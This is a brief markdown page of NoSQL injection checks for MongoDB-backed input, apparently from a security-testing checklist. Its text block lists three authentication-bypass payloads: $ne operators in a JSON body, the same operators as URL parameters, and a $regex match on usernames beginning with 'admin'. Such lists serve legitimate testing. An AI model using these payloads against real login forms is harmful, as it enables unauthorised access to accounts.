# NoSQL injection checks

Mongo-backed input: compare literals with operators. See also [authentication.md](authentication.md).

```text
{"user":{"$ne":null},"pass":{"$ne":null}}
user[$ne]=x&pass[$ne]=x
user[$regex]=^admin
```
